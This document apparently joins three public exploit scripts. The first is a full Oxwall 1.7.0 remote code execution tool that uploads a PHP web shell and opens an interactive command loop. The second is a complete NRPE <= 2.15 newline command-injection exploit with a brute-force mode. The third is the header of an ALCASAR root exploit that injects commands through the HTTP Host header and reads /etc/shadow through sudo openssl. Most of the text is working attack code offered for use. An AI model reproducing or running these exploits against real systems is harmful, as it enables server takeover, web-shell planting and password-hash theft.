# Desc: Oxwall suffers from an authenticated arbitrary PHP code
# execution. The vulnerability is caused due to the improper
# verification of uploaded files in '/admin/settings/user' script
# thru the 'avatar' and 'bigAvatar' POST parameters. This can be
# exploited to execute arbitrary PHP code by uploading a malicious
# PHP script file with '.php5' extension (to bypass the '.htaccess'
# block rule) that will be stored in '/ow_userfiles/plugins/base/avatars/'
# directory.
#
# Tested on: Kali Linux 3.7-trunk-686-pae
#    	     Apache/2.2.22 (Debian)
#            PHP 5.4.4-13(apache2handler)
#            MySQL 5.5.28
#
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
#
# Zero Science Lab - http://www.zeroscience.mk
# Macedonian Information Security Research And Development Laboratory
#
#
# Advisory ID: ZSL-2014-5196
# Advisory URL: http://zeroscience.mk/en/vulnerabilities/ZSL-2014-5196.php
#
#
# 18.07.2014
#
#

version = '3.0.0.251'

import itertools, mimetools, mimetypes
import cookielib, urllib, urllib2, sys
import logging, os, time, datetime, re

from colorama import Fore, Back, Style, init
from cStringIO import StringIO
from urllib2 import URLError

init()

if os.name == 'posix': os.system('clear')
if os.name == 'nt': os.system('cls')
piton = os.path.basename(sys.argv[0])

def bannerche():
	print '''
 @---------------------------------------------------------------@
 |                                                               |
 |          Oxwall 1.7.0 Remote Code Execution Exploit           |
 |                                                               |
 |                                                               |
 |                       ID: ZSL-2014-5196                       |
 |                                                               |
 |              Copyleft (c) 2014, Zero Science Lab              |
 |                                                               |
 @---------------------------------------------------------------@
          '''
	if len(sys.argv) < 2:
		print '\n\x20\x20[*] '+Fore.YELLOW+'Usage: '+Fore.RESET+piton+' <hostname>\n'
		print '\x20\x20[*] '+Fore.CYAN+'Example: '+Fore.RESET+piton+' zeroscience.mk\n'
		sys.exit()

bannerche()

print '\n\x20\x20[*] Initialising exploit '+'.'*34+Fore.GREEN+'[OK]'+Fore.RESET

host = sys.argv[1]

cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))

try:
	opener.open('http://'+host+'/sign-in?back-uri=admin')
except urllib2.HTTPError, errorzio:
	if errorzio.code == 404:
		print '\x20\x20[*] Checking path '+'.'*41+Fore.RED+'[ER]'+Fore.RESET
		print '\x20\x20[*] '+Fore.YELLOW+'Check your path entry.'+Fore.RESET
		print
		sys.exit()
except URLError, errorziocvaj:
	if errorziocvaj.reason:
		print '\x20\x20[*] Checking host '+'.'*41+Fore.RED+'[ER]'+Fore.RESET
		print '\x20\x20[*] '+Fore.YELLOW+'Check your hostname entry.'+Fore.RESET
		print
		sys.exit()

print '\x20\x20[*] Checking host and path '+'.'*32+Fore.GREEN+'[OK]'+Fore.RESET
print '\x20\x20[*] Login please.'

username = raw_input('\x20\x20[*] Enter username: ')
password = raw_input('\x20\x20[*] Enter password: ')

login_data = urllib.urlencode({
							'form_name' : 'sign-in',
							'identity' : username,
							'password' : password,
							'remember' : 'on',
							'submit' : 'Sign In'
							})

try:
	login = opener.open('http://'+host+'/sign-in?back-uri=admin', login_data)
	auth = login.read()
except urllib2.HTTPError, errorziotraj:
	if errorziotraj.code == 403:
		print '\x20\x20[*] '+Fore.RED+'Blocked by WAF.'+Fore.RESET
		print
		sys.exit()

for session in cj:
	sessid = session.name

print '\x20\x20[*] Mapping session ID '+'.'*36+Fore.GREEN+'[OK]'+Fore.RESET
ses_chk = re.search(r'%s=\w+' % sessid , str(cj))
cookie = ses_chk.group(0)
print '\x20\x20[*] Cookie: '+Fore.YELLOW+cookie+Fore.RESET

if re.search(r'Invalid username or email', auth):
	print '\x20\x20[*] Invalid username or email given '+'.'*23+Fore.RED+'[ER]'+Fore.RESET
	print
	sys.exit()
elif re.search(r'Invalid password', auth):
	print '\x20\x20[*] Invalid password '+'.'*38+Fore.RED+'[ER]'+Fore.RESET
	sys.exit()
else:
	print '\x20\x20[*] Authenticated '+'.'*41+Fore.GREEN+'[OK]'+Fore.RESET


class MultiPartForm(object):

    def __init__(self):
        self.form_fields = []
        self.files = []
        self.boundary = mimetools.choose_boundary()
        return
    
    def get_content_type(self):
        return 'multipart/form-data; boundary=%s' % self.boundary

    def add_field(self, name, value):
        self.form_fields.append((name, value))
        return

    def add_file(self, fieldname, filename, fileHandle, mimetype=None):
        body = fileHandle.read()
        if mimetype is None:
            mimetype = mimetypes.guess_type(filename)[0] or 'application/octet-stream'
        self.files.append((fieldname, filename, mimetype, body))
        return
    
    def __str__(self):

        parts = []
        part_boundary = '--' + self.boundary
        
        parts.extend(
            [ part_boundary,
              'Content-Disposition: form-data; name="%s"' % name,
              '',
              value,
            ]
            for name, value in self.form_fields
            )
        
        parts.extend(
            [ part_boundary,
              'Content-Disposition: file; name="%s"; filename="%s"' % \
                 (field_name, filename),
              'Content-Type: %s' % content_type,
              '',
              body,
            ]
            for field_name, filename, content_type, body in self.files
            )
        
        flattened = list(itertools.chain(*parts))
        flattened.append('--' + self.boundary + '--')
        flattened.append('')
        return '\r\n'.join(flattened)

if __name__ == '__main__':

    form = MultiPartForm()
    form.add_field('form_name', 'userSettingsForm')
    form.add_field('displayName', 'realname')
    form.add_field('confirmEmail', 'on')
    form.add_field('avatarSize', '90')
    form.add_field('bigAvatarSize', '190')
    form.add_field('avatar', '')
    form.add_field('join_display_photo_upload', 'display')
    form.add_field('save', 'Save')
    
    form.add_file('bigAvatar', 'thricerbd.php5', 
                  fileHandle=StringIO('<?php system(\'echo \"<?php echo \\"<pre>\\"; passthru(\$_GET[\\\'cmd\\\']); echo \\"</pre>\\"; ?>\" > liwo.php5\'); ?>'))

    request = urllib2.Request('http://'+host+'/admin/settings/user')
    request.add_header('User-agent', 'joxypoxy 3.0')
    body = str(form)
    request.add_header('Content-type', form.get_content_type())
    request.add_header('Cookie', cookie)
    request.add_header('Content-length', len(body))
    request.add_data(body)
    request.get_data()
    urllib2.urlopen(request).read()
    print '\x20\x20[*] Sending payload '+'.'*39+Fore.GREEN+'[OK]'+Fore.RESET
    checkfilename = urllib2.urlopen(request).read()
    filename = re.search('default_avatar_big_(\w+)', checkfilename).group(1)
    print '\x20\x20[*] Getting file name '+'.'*37+Fore.GREEN+'[OK]'+Fore.RESET
    print '\x20\x20[*] File name: '+Fore.YELLOW+'default_avatar_big_'+filename+'.php5'+Fore.RESET

opener.open('http://'+host+'/ow_userfiles/plugins/base/avatars/default_avatar_big_'+filename+'.php5')
print '\x20\x20[*] Persisting file liwo.php5 '+'.'*29+Fore.GREEN+'[OK]'+Fore.RESET

print '\x20\x20[*] Starting logging service '+'.'*30+Fore.GREEN+'[OK]'+Fore.RESET
print '\x20\x20[*] Spawning shell '+'.'*40+Fore.GREEN+'[OK]'+Fore.RESET
time.sleep(1)

furl = '/ow_userfiles/plugins/base/avatars/liwo.php5'

print
today = datetime.date.today()
fname = 'oxwall-'+today.strftime('%d-%b-%Y')+time.strftime('_%H%M%S')+'.log'
logging.basicConfig(filename=fname,level=logging.DEBUG)

logging.info(' '+'+'*75)
logging.info(' +')
logging.info(' + Log started: '+today.strftime('%A, %d-%b-%Y')+time.strftime(', %H:%M:%S'))
logging.info(' + Title: Oxwall 1.7.0 Remote Code Execution Exploit')
logging.info(' + Python program executed: '+sys.argv[0])
logging.info(' + Version: '+version)
logging.info(' + Full query: \''+piton+'\x20'+host+'\'')
logging.info(' + Username input: '+username)
logging.info(' + Password input: '+password)
logging.info(' + Vector: '+'http://'+host+furl)
logging.info(' +')
logging.info(' + Advisory ID: ZSL-2014-5196')
logging.info(' + Zero Science Lab - http://www.zeroscience.mk')
logging.info(' +')
logging.info(' '+'+'*75+'\n')

print Style.DIM+Fore.CYAN+'\x20\x20[*] Press [ ENTER ] to INSERT COIN!\n'+Style.RESET_ALL+Fore.RESET
raw_input()
while True:
	try:
		cmd = raw_input(Fore.RED+'shell@'+host+':~# '+Fore.RESET)
		execute = opener.open('http://'+host+furl+'?cmd='+urllib.quote(cmd))
		reverse = execute.read()
		pattern = re.compile(r'<pre>(.*?)</pre>',re.S|re.M)

		print Style.BRIGHT+Fore.CYAN
		cmdout = pattern.match(reverse)
		print cmdout.groups()[0].strip()
		print Style.RESET_ALL+Fore.RESET

		if cmd.strip() == 'exit':
			break

		logging.info('Command executed: '+cmd+'\n\nOutput: \n'+'='*8+'\n\n'+cmdout.groups()[0].strip()+'\n\n'+'-'*60+'\n')
	except Exception:
		break

logging.warning('\n\nLog ended: '+today.strftime('%A, %d-%b-%Y')+time.strftime(', %H:%M:%S')+'\n\nEND OF LOG')
print '\x20\x20[*] Carpe commentarius '+'.'*36+Fore.GREEN+'[OK]'+Fore.RESET
print '\x20\x20[*] Log file: '+Fore.YELLOW+fname+Fore.RESET
print

sys.exit()
#!/usr/bin/python
#
#
# Exploit Title : NRPE <= 2.15 Remote Code Execution Vulnerability
#
# Discovered by  : Dawid Golunski
#                  dawid (at) legalhackers (dot) com
#                  legalhackers.com
#
# Exploit Author : Claudio Viviani
#                  http://www.homelab.it
#
#                  info@homelab.it
#                  homelabit@protonmail.ch
#
#                  https://www.facebook.com/homelabit
#                  https://twitter.com/homelabit
#                  https://plus.google.com/+HomelabIt1/
#                  https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
#
#
#
# C crc32 function ripped from check_nrpe_clone by Alan Brenner <alan.brenner@ithaka.org>
#                                       http://www.abcompcons.com/files/nrpe_client.py
#
# pyOpenSSL Library required (http://pyopenssl.sourceforge.net/)
#
# [root@localhost ~]# pip-python install pyOpenSSL
#
# NRPE <= 2.15 Remote Command Execution Vulnerability
# Release date: 17.04.2014
# Discovered by: Dawid Golunski
# Severity: High
# CVE-2014-2913
#
# http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-2913
# http://www.exploit-db.com/exploits/32925/
# http://www.homelab.it/index.php/2014/05/03/nagios-nrpe-remote-command-injection-test-fix/ (ITA)
#
# Tested on CentOS 5.x, CentOS 6.x, BacBox 3.x, KaliLinux 1.0.6 with Python 2.x
#
# Demo: https://www.youtube.com/watch?v=nmYiBdnWWcE
#

import OpenSSL # non-standard, see http://pyopenssl.sourceforge.net/
import optparse
import os
import signal
import socket
import struct
import sys
import time

banner = """

$$\   $$\ $$$$$$$\  $$$$$$$\  $$$$$$$$\        $$$$$$\        $$\  $$$$$$$\\
$$$\  $$ |$$  __$$\ $$  __$$\ $$  _____|      $$  __$$\     $$$$ | $$  ____|
$$$$\ $$ |$$ |  $$ |$$ |  $$ |$$ |            \__/  $$ |    \_$$ | $$ |
$$ $$\$$ |$$$$$$$  |$$$$$$$  |$$$$$\           $$$$$$  |      $$ | $$$$$$$\\
$$ \$$$$ |$$  __$$< $$  ____/ $$  __|         $$  ____/       $$ | \_____$$\\
$$ |\$$$ |$$ |  $$ |$$ |      $$ |            $$ |            $$ | $$\   $$ |
$$ | \$$ |$$ |  $$ |$$ |      $$$$$$$$\       $$$$$$$$\ $$\ $$$$$$\\$$$$$$  |
\__|  \__|\__|  \__|\__|      \________|      \________|\__|\______|\______/



                  $$$$$$$\   $$$$$$\  $$$$$$$$\\
                  $$  __$$\ $$  __$$\ $$  _____|
                  $$ |  $$ |$$ /  \__|$$ |
                  $$$$$$$  |$$ |      $$$$$\\
                  $$  __$$< $$ |      $$  __|
                  $$ |  $$ |$$ |  $$\ $$ |
                  $$ |  $$ |\$$$$$$  |$$$$$$$$\\
                  \__|  \__| \______/ \________|
                                                   NRPE <= 2.15 R3m0t3 C0mm4nd Ex3cut10n


                =============================================
                - Release date: 17.04.2014
                - Discovered by: Dawid Golunski
                - Severity: High
                - CVE: 2014-2913
                =============================================

                                Written by:

                              Claudio Viviani

                           http://www.homelab.it

                              info@homelab.it
                           homelabit@protonmail.ch

                      https://www.facebook.com/homelabit
                      https://twitter.com/homelabit
                      https://plus.google.com/+HomelabIt1/
            https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww

"""
# Plugin list for Brute force mode
PluginList = ['check_all',
             'check_apt',
             'check_bdii',
             'check_bonding',
             'check_breeze',
             'check_by_ssh',
             'check_check-updates',
             'check_check_sip',
             'check_cluster',
             'check_dhcp',
             'check_dig',
             'check_disk',
             'check_disk_smb',
             'check_dns',
             'check_dpm-disk',
             'check_dpm-head',
             'check_dummy',
             'check_file_age',
             'check_flexlm',
             'check_fping',
             'check_game',
             'check_hpjd',
             'check_http',
             'check_icmp',
             'check_ide_smart',
             'check_ifoperstatus',
             'check_ifstatus',
             'check_ircd',
             'check_lcgdm',
             'check_lcgdm-common',
             'check_ldap',
             'check_lfc',
             'check_linux_raid',
             'check_load',
             'check_log',
             'check_mailq',
             'check_mrtg',
             'check_mrtgtraf',
             'check_mysql',
             'check_nagios',
             'check_nrpe',
             'check_nt',
             'check_ntp',
             'check_nwstat',
             'check_openmanage',
             'check_oracle',
             'check_overcr',
             'check_perl',
             'check_pgsql',
             'check_ping',
             'check_procs',
             'check_radius',
             'check_real',
             'check_rhev',
             'check_rpc',
             'check_sensors',
             'check_smtp',
             'check_snmp',
             'check_ssh',
             'check_swap',
             'check_tcp',
             'check_time',
             'check_ups',
             'check_users',
             'check_wave']



# nrpe 2.15 skip chars "|`&><'\"\\[]{};" and "$()" but not "\x0a"(new line)
evilchar = "\x0a"

QUERY_PACKET    = 1
RESPONSE_PACKET = 2

NRPE_PACKET_VERSION_2 = 2

# max amount of data we'll send in one query/response
MAX_PACKETBUFFER_LENGTH = 1024


#def debug(sMessage):
#    """Send a string to STDERR"""
#    if DEBUG:
#        sys.stderr.write("%s\n" % sMessage)

class DataPacket:
    """A Python implementation of the C struct, packet."""
    def __init__(self, packet_version, packet_type):
        self.nPacketVersion = packet_version # int16
        self.nPacketType = packet_type # int16
        self.nCRC32 = 0 # u_int32
        self.nResultCode = 2324 # int16
        self.sData = ''
        self.tCRC32 = (
             0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419,
             0x706af48f, 0xe963a535, 0x9e6495a3, 0x0edb8832, 0x79dcb8a4,
             0xe0d5e91e, 0x97d2d988, 0x09b64c2b, 0x7eb17cbd, 0xe7b82d07,
             0x90bf1d91, 0x1db71064, 0x6ab020f2, 0xf3b97148, 0x84be41de,
             0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7, 0x136c9856,
             0x646ba8c0, 0xfd62f97a, 0x8a65c9ec, 0x14015c4f, 0x63066cd9,
             0xfa0f3d63, 0x8d080df5, 0x3b6e20c8, 0x4c69105e, 0xd56041e4,
             0xa2677172, 0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b,
             0x35b5a8fa, 0x42b2986c, 0xdbbbc9d6, 0xacbcf940, 0x32d86ce3,
             0x45df5c75, 0xdcd60dcf, 0xabd13d59, 0x26d930ac, 0x51de003a,
             0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423, 0xcfba9599,
             0xb8bda50f, 0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924,
             0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d, 0x76dc4190,
             0x01db7106, 0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f,
             0x9fbfe4a5, 0xe8b8d433, 0x7807c9a2, 0x0f00f934, 0x9609a88e,
             0xe10e9818, 0x7f6a0dbb, 0x086d3d2d, 0x91646c97, 0xe6635c01,
             0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e, 0x6c0695ed,
             0x1b01a57b, 0x8208f4c1, 0xf50fc457, 0x65b0d9c6, 0x12b7e950,
             0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3,
             0xfbd44c65, 0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2,
             0x4adfa541, 0x3dd895d7, 0xa4d1c46d, 0xd3d6f4fb, 0x4369e96a,
             0x346ed9fc, 0xad678846, 0xda60b8d0, 0x44042d73, 0x33031de5,
             0xaa0a4c5f, 0xdd0d7cc9, 0x5005713c, 0x270241aa, 0xbe0b1010,
             0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,
             0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17,
             0x2eb40d81, 0xb7bd5c3b, 0xc0ba6cad, 0xedb88320, 0x9abfb3b6,
             0x03b6e20c, 0x74b1d29a, 0xead54739, 0x9dd277af, 0x04db2615,
             0x73dc1683, 0xe3630b12, 0x94643b84, 0x0d6d6a3e, 0x7a6a5aa8,
             0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1, 0xf00f9344,
             0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb,
             0x196c3671, 0x6e6b06e7, 0xfed41b76, 0x89d32be0, 0x10da7a5a,
             0x67dd4acc, 0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5,
             0xd6d6a3e8, 0xa1d1937e, 0x38d8c2c4, 0x4fdff252, 0xd1bb67f1,
             0xa6bc5767, 0x3fb506dd, 0x48b2364b, 0xd80d2bda, 0xaf0a1b4c,
             0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55, 0x316e8eef,
             0x4669be79, 0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236,
             0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f, 0xc5ba3bbe,
             0xb2bd0b28, 0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31,
             0x2cd99e8b, 0x5bdeae1d, 0x9b64c2b0, 0xec63f226, 0x756aa39c,
             0x026d930a, 0x9c0906a9, 0xeb0e363f, 0x72076785, 0x05005713,
             0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38, 0x92d28e9b,
             0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21, 0x86d3d2d4, 0xf1d4e242,
             0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1,
             0x18b74777, 0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c,
             0x8f659eff, 0xf862ae69, 0x616bffd3, 0x166ccf45, 0xa00ae278,
             0xd70dd2ee, 0x4e048354, 0x3903b3c2, 0xa7672661, 0xd06016f7,
             0x4969474d, 0x3e6e77db, 0xaed16a4a, 0xd9d65adc, 0x40df0b66,
             0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,
             0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605,
             0xcdd70693, 0x54de5729, 0x23d967bf, 0xb3667a2e, 0xc4614ab8,
             0x5d681b02, 0x2a6f2b94, 0xb40bbe37, 0xc30c8ea1, 0x5a05df1b,
             0x2d02ef8d)

    def __str__(self):
        # Turn whatever string data we have into a null terminated string
        if len(self.sData) < MAX_PACKETBUFFER_LENGTH:
            sData = self.sData + "\0" * (MAX_PACKETBUFFER_LENGTH - len(self.sData))
            sData += "SR" # not sure about this, from perl
        elif len(self.sData) == MAX_PACKETBUFFER_LENGTH + 2:
            sData = self.sData
        else:
            raise ValueError("CHECK_NRPE: invalid input")
        # Return a string that equals the C struct, not something printable
        return struct.pack("!hhLh" + str(len(sData)) + "s", self.nPacketVersion,
            self.nPacketType, self.nCRC32, self.nResultCode, sData)

    def __len__(self):
        return len(self.__str__())

    def dumpself(self):
        """Debugging output for self as C structure.

        Not normally used."""
        sElf = self.__str__()
        sPrev = sElf[0:1]
        nCount = 0
        ii = -1
        for sChar in sElf[1:]:
            ii += 1
            if sChar == sPrev:
                nCount += 1
                continue
            if nCount:
                print "%d\t%d *" % (ii - nCount, nCount + 1),
                nCount = 0
            else:
                print "%d\t" % ii,
            print "\t'%s' (%d)" % (sPrev, ord(sPrev))
            sPrev = sChar
        print "%d\t\t'%s' (%d)" % (ii + 1, sPrev, ord(sPrev))

    def calculate_crc32(self):
        """Calculate the CRC32 value for the string version of self."""
        nCRC = 0xFFFFFFFF
        for ii in self.__str__():
            nIndex = (nCRC ^ ord(ii)) & 0xFF
            nCRC = ((nCRC >> 8) & 0x00FFFFFF) ^ self.tCRC32[nIndex]
        self.nCRC32 = nCRC ^ 0xFFFFFFFF
        #debug("DataPacket.calculate_crc32 = %d" % self.nCRC32)

    def extract(self, sQuery):
        """Turn a string into the DataPacket attributes."""
        #debug("DataPacket.extract(%d)" % len(sQuery))
        tVals = struct.unpack("!hhLh" + str(len(sQuery) - 10) + "s", sQuery)
        self.nPacketVersion = tVals[0]
        self.nPacketType = tVals[1]
        self.nCRC32 = tVals[2]
        self.nResultCode = tVals[3]
        self.sData = tVals[4]

m_nTimeout = 0
def alarm_handler(nSignum, oFrame):
    """Timeout catcher"""
    raise KeyboardInterrupt("CHECK_NRPE: Socket timeout after %d seconds." %
        m_nTimeout)


class NrpeClient(DataPacket):
    """Everything needed to send a message to an NRPE server and get data back.
    """
    def __init__(self, server_name, server_port=5666, use_ssl=True, timeout=10,
                 packet_version=NRPE_PACKET_VERSION_2):
        DataPacket.__init__(self, packet_version, QUERY_PACKET)
        self.sServer = server_name
        self.nPort = server_port
        self.bUseSSL = use_ssl
        self.nTimeout = timeout

    def run_query(self, sQuery):
        """Connect to the NRPE server, send the query and get back data.
        """
        # initialize alarm signal handling and set timeout
        signal.signal(signal.SIGALRM, alarm_handler)
        signal.alarm(self.nTimeout)

        # try to connect to the host at the given port number
        oSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # do SSL handshake
        if self.bUseSSL:
            oContext = OpenSSL.SSL.Context(OpenSSL.SSL.TLSv1_METHOD)
            oContext.set_cipher_list('ADH')
            oConnection = OpenSSL.SSL.Connection(oContext, oSocket)
        else:
            oConnection = oSocket

        oConnection.connect((self.sServer, self.nPort))

        # we're connected and ready to go
        self.sData = sQuery
        self.nCRC32 = 0
        self.calculate_crc32()

        # send the packet
        oConnection.send(str(self))

        # wait for the response packet
        sRval = oConnection.recv(len(self))

        # close the connection
        if self.bUseSSL and not oConnection.shutdown():
            try:
                sRval += oConnection.recv(len(self))
            except OpenSSL.SSL.ZeroReturnError:
                pass
        oSocket.close()
        del oSocket, oConnection
        if self.bUseSSL:
            del oContext

        # reset timeout
        signal.alarm(0)

        if len(sRval) == 0:
            raise IOError("CHECK_NRPE: Received 0 bytes from daemon." +
                "Check the remote server logs for error messages.")
        elif len(sRval) < len(self):
            raise IOError("CHECK_NRPE: Receive underflow - only " +
                "%d bytes received (%d expected)." % (len(sRval), len(self)))

        # Become the received data
        self.extract(sRval)

        # check the crc 32 value
        nRvalCRC = self.nCRC32
        self.nCRC32 = 0
        self.calculate_crc32()
        if nRvalCRC != self.nCRC32:
            raise ValueError("CHECK_NRPE: Response packet had invalid CRC32.")

        # check packet version
        if self.nPacketVersion != NRPE_PACKET_VERSION_2:
            raise ValueError("CHECK_NRPE: Invalid packet version received from server.")

        # check packet type
        if self.nPacketType != RESPONSE_PACKET:
            raise ValueError("CHECK_NRPE: Invalid packet type received from server.")

        # Turn the input data into a proper python string (chop at first NULL)
        for ii in range(len(self.sData)):
            if self.sData[ii] == "\0":
                break
        self.sData = self.sData[0:ii]


if __name__ == '__main__':
    m_oOpts = optparse.OptionParser("%prog -H Host_or_IP -c nrpe_command --cmd=\"command to execute\" [-b, --brute] [-n] [-p PORT] [--timeout sec] [--list]")
    m_oOpts.add_option('--host', '-H', action='store', type='string',
        help='The address of the host running the NRPE daemon (required)')
    m_oOpts.add_option('--ssl', '-n', action='store_false', default=True,
        help='Do no use SSL')
    m_oOpts.add_option('--port', '-p', action='store', type='int', default=5666,
        help='The port on which the daemon is running (default=5666)')
    m_oOpts.add_option('--timeout', '-t', action='store', type='int',
        default=10,
        help='Number of seconds before connection times out (default=10)')
    m_oOpts.add_option('--command', '-c', action='store', type='string',
        #default='get_data',
        help='The name of nrpe command')
    m_oOpts.add_option('--brute', '-b', action='store_true', default=False,
        help='Find existing nrpe command from list [ -list ]')
    m_oOpts.add_option('--list', action='store_true',  default=False,
        help='Show NRPE Command list')
    m_oOpts.add_option('--cmd', action='store', type='string',
        help='Command to execute on the remote server')

    m_oOptions, m_lArgs = m_oOpts.parse_args()
    m_nTimeout = m_oOptions.timeout
    m_sQuery = m_oOptions.command
    m_gList = m_oOptions.list
    m_sBrute = m_oOptions.brute

    print (banner)

    if m_gList:
        print('[+] NRPE Command list\n')
        for LinesPluginList in PluginList:
            print(LinesPluginList)
        sys.exit(0)
    elif m_sQuery and m_sBrute:
        print m_oOpts.format_help()
        print('[!]')
        print('[!] ERROR: Select only -c OR -b option\n')
        sys.exit(0)
    elif not m_oOptions.host or not m_oOptions.cmd:
        print m_oOpts.format_help()
        sys.exit(0)

    print('[+] Target: '+m_oOptions.host)
    print('[+] Command: '+m_oOptions.cmd+' \n')

    if m_sBrute:
        print('[+] Brute force Mode....')
        print('[+]')
        for LinesPluginList in PluginList:

                m_CommandQuery = ""
                m_CommandQuery += ' ' + m_oOptions.cmd
                if m_lArgs:
                        m_CommandQuery += ' ' + ' '.join(m_lArgs)

                m_sQuery = LinesPluginList+'!'+str(evilchar)+str(m_CommandQuery)+' #'


                m_oNRPE = NrpeClient(m_oOptions.host, m_oOptions.port, m_oOptions.ssl,
                        m_oOptions.timeout)
                try:
                        m_oNRPE.run_query(m_sQuery)
                except socket.error:
                        print('[!] Connection Error!')
                        sys.exit(1)
                except OpenSSL.SSL.ZeroReturnError:
                        print('[!] Not Vulnerable')
                        print('[!] Option dont_blame_nrpe disabled or service fixed')
                        sys.exit(1)

                if m_oNRPE.sData[-11:] == "not defined":
                        print('[-] Checking for NRPE command '+LinesPluginList+':\t\t\tnot found')
                else:
                        print('[+] Checking for NRPE command '+LinesPluginList+':\t\t\tVULNERABLE!')
                        print('[+]')
                        print('[+] Max Output CHAR 1024 (According to NRPE <= 2.15 specifications)')
                        print('[+]')
                        print('[+] Please ignore NRPE plugin command messages (Usage or Errors)')
                        print('[+]')
                        print(m_oNRPE.sData)
                        sys.exit(0)
    elif m_sQuery:
        print('[+] Custom command Mode....')
        print('[+]')
        print('[+] Connecting......')

        m_CommandQuery = ""
        m_CommandQuery += ' ' + m_oOptions.cmd
        if m_lArgs:
                m_CommandQuery += ' ' + ' '.join(m_lArgs)

        m_sQuery = m_sQuery+'!'+str(evilchar)+str(m_CommandQuery)+' #'

        m_oNRPE = NrpeClient(m_oOptions.host, m_oOptions.port, m_oOptions.ssl,
                m_oOptions.timeout)
        try:
               m_oNRPE.run_query(m_sQuery)
        except KeyboardInterrupt:
                print("[!] CHECK_NRPE: Socket timeout after %d seconds." % m_nTimeout)
                sys.exit(1)
        except socket.error:
                print('[!] Connection Error!')
                sys.exit(1)
        except OpenSSL.SSL.ZeroReturnError:
                print('[!] Not Vulnerable')
                print('[!] Option dont_blame_nrpe disabled or service fixed')
                sys.exit(1)

        if m_oNRPE.sData[-11:] == "not defined":
                print('[-] Checking for NRPE command '+m_oOptions.command+': not found...try other NRPE command')
        else:
                print('[+] Checking for NRPE command '+m_oOptions.command+': VULNERABLE!')
                print('[+]')
                print('[+] Max Output CHAR 1024 (According to NRPE <= 2.15 specifications)')
                print('[+]')
                print('[+] Please ignore NRPE plugin command messages (Usage or Errors)')
                print('[+]')
                print(m_oNRPE.sData)
                sys.exit(0)

#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
####
#
#    ALCASAR <= 2.8 Remote Root Code Execution Vulnerability
#
#    Author: eF
#    Date  : 2014-02-10
#
#
#        db         88           ,ad8888ba,         db         ad88888ba         db         88888888ba
#       d88b        88          d8"'    `"8b       d88b       d8"     "8b       d88b        88      "8b
#      d8'`8b       88         d8'                d8'`8b      Y8,              d8'`8b       88      ,8P
#     d8'  `8b      88         88                d8'  `8b     `Y8aaaaa,       d8'  `8b      88aaaaaa8P'
#    d8YaaaaY8b     88         88               d8YaaaaY8b      `"""""8b,    d8YaaaaY8b     88""""88'
#   d8""""""""8b    88         Y8,             d8""""""""8b           `8b   d8""""""""8b    88    `8b
#  d8'        `8b   88          Y8a.    .a8P  d8'        `8b  Y8a     a8P  d8'        `8b   88     `8b
# d8'          `8b  88888888888  `"Y8888Y"'  d8'          `8b  "Y88888P"  d8'          `8b  88      `8b
#
#
# ALCASAR is a free Network Access Controller which controls the Internet 
# consultation networks. It authenticates, attributes and protects users'
# access regardless their connected equipment (PC, Pokédex, game console,
# etc.).
#
#
# ALCASAR Web UI, accessible by any unauthenticated user, suffers from a 
# trivial vulnerability. In the "index.php" file:
#
#   $pattern = preg_replace('/www./','',$_SERVER['HTTP_HOST']);
#   exec("grep -Re ^$pattern$ /etc/dansguardian/lists/blacklists/*/domains|cut -d'/' -f6", $output);
#
# By sending a specially crafted value in the "host" HTTP header, it is possible
# to inject the exec() function in order to execute commands as Apache user.
# 
# In addition, the Apache user is able to call sudo for these binaries:
# 
# /sbin/ip,/sbin/arping,/sbin/arp,/usr/sbin/arpscan,/usr/sbin/tcpdump,/usr/local/bin/alcasar-watchdog.sh,/usr/local/sbin/alcasar-dhcp.sh
# /usr/local/bin/alcasar-conf.sh
# /usr/local/sbin/alcasar-mysql.sh
# /usr/local/sbin/alcasar-bl.sh,/usr/local/sbin/alcasar-havp.sh,/usr/local/bin/alcasar-file-clean.sh,/usr/local/sbin/alcasar-url_filter.sh
# /usr/local/sbin/alcasar-nf.sh,/usr/local/bin/alcasar-iptables.sh,/usr/sbin/ipset 
# /usr/local/bin/alcasar-archive.sh
# /usr/bin/radwho,/usr/sbin/chilli_query
# /usr/local/sbin/alcasar-logout.sh
# /sbin/service,/usr/bin/killall,/sbin/chkconfig,/bin/systemctl
# /usr/bin/openssl
# 
# As a result, we can use /usr/bin/openssl to read a file as root:
# 
#   sudo /usr/bin/openssl base64 -in /etc/shadow -A | base64 -d
# 
